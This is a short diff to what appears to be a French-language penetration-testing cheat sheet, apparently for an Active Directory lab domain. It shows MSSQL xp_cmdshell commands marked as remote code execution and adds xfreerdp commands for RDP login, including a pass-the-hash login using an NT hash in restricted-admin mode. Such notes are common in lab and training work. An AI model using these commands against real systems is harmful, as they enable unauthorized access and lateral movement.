@@ -105,3 +105,12 @@ EXEC xp_cmdshell 'whoami';                                   -- RCE
 
 EXEC xp_cmdshell 'net share';  -- Retrouver le chemin réel des shares SMB sur la machine
 ```
+
+## RDP 
+
+```bash
+xfreerdp /v:$IP /u:$USER /p:$PASSWORD /d:IMPERIUM.LOCAL /cert-ignore 
+
+xfreerdp /v:$IP /u:$USER /pth:$NT_HASH /d:IMPERIUM.LOCAL /cert-ignore /restricted-admin
+
+```
